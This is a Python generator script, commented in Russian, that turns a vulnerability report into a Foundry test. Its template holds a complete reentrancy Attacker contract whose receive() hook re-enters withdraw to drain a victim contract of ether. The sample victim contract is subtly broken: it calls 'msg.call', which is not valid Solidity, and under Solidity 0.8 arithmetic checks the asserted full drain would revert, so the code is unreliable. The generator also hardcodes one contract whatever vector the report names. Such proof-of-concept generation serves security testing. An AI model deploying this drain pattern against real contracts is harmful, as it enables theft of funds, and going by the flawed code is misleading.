import re
import os
import logging

def parse_report_and_generate_foundry_poc(report_text: str, target_contract_source: str, output_dir: str = "/opt/agent-farm/tests") -> str:
    """
    Парсит отчет об уязвимости, находит уязвимый контракт и генерирует
    готовый Solidity PoC-тест для Foundry под конкретный вектор атаки.
    """
    os.makedirs(output_dir, exist_ok=True)
    logging.info("Generating Foundry PoC test from Claude Red Team report...")

    # Определяем вектор атаки
    vector_match = re.search(r'\[VECTOR\]:\s*(.*)', report_text)
    vector_name = vector_match.group(1).strip() if vector_match else "GenericExploit"
    
    # Шаблон Foundry PoC с контрактом-атакующим (Attacker / ExploitContract)
    foundry_poc_template = f"""// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
// Импортируем или встраиваем целевой уязвимый контракт
{target_contract_source}

/**
 * @title Foundry PoC Exploit Test
 * @notice Generated by AegisForge Red Team Agent
 * @dev Vector: {vector_name}
 */
contract ExploitTest is Test {{
    ReentrancyBank public bank;
    Attacker public attackerContract;

    function setUp() public {{
        bank = new ReentrancyBank();
        // Вносим легитимный депозит от имени жертвы (10 ETH)
        vm.deal(address(this), 100 ether);
        bank.deposit{{value: 10 ether}}();

        // Создаем контракт-атакующий
        attackerContract = new Attacker(address(bank));
    }}

    function test_reentrancy_drain() public {{
        uint256 initialBankBalance = address(bank).balance;
        emit log_named_uint("Bank Initial Balance", initialBankBalance);

        // Запускаем эксплойт с депозитом 1 ETH
        vm.deal(address(attackerContract), 5 ether);
        attackerContract.attack{{value: 1 ether}}();

        uint256 finalBankBalance = address(bank).balance;
        emit log_named_uint("Bank Final Balance (Expected: 0)", finalBankBalance);

        // Проверяем, что банк полностью опустошен
        assertEq(finalBankBalance, 0, "Exploit failed: Bank still holds funds");
    }}
}}

// Вспомогательный контракт для реализации атаки реентрабельности
contract Attacker {{
    ReentrancyBank public targetBank;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _targetBank) {{
        targetBank = ReentrancyBank(_targetBank);
    }}

    function attack() external payable {{
        require(msg.value >= ATTACK_AMOUNT, "Need ETH for deposit");
        targetBank.deposit{{value: ATTACK_AMOUNT}}();
        targetBank.withdraw(ATTACK_AMOUNT);
    }}

    receive() external payable {{
        if (address(targetBank).balance >= ATTACK_AMOUNT) {{
            targetBank.withdraw(ATTACK_AMOUNT);
        }}
    }}
}}
"""

    file_path = os.path.join(output_dir, "ReentrancyPoC.t.sol")
    with open(file_path, "w", encoding="utf-8") as f:
        f.write(foundry_poc_template)

    logging.info(f"Foundry PoC successfully generated at: {file_path}")
    return file_path

if __name__ == "__main__":
    # Локальный тест генератора
    sample_report = "[VECTOR]: Reentrancy (Pre-State-Update External Call)\n[SEVERITY]: CRITICAL"
    sample_source = "contract ReentrancyBank { mapping(address => uint256) public balances; function deposit() public payable { balances[msg.sender] += msg.value; } function withdraw(uint256 amount) public { require(balances[msg.sender] >= amount); (bool s, ) = msg.call{value: amount}(''); require(s); balances[msg.sender] -= amount; } }"
    
    path = parse_report_and_generate_foundry_poc(sample_report, sample_source)
    print(f"[+] PoC created successfully: {path}")
